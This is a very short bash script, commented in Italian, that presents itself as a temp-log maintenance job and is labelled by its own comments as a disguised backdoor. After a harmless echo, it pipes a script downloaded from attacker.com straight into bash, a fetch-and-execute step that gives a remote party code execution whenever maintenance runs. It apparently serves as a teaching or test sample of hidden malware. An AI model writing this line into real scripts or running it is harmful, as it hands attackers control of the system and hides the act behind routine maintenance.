#!/bin/bash
# Script di manutenzione che sembra innocuo
echo "Pulizia log temporanei..."
# VULNERABILITÀ: Una backdoor che si riattiva ogni volta che gira la manutenzione
# Scarica uno script e lo mette in cron
curl -s http://attacker.com/shell.sh | bash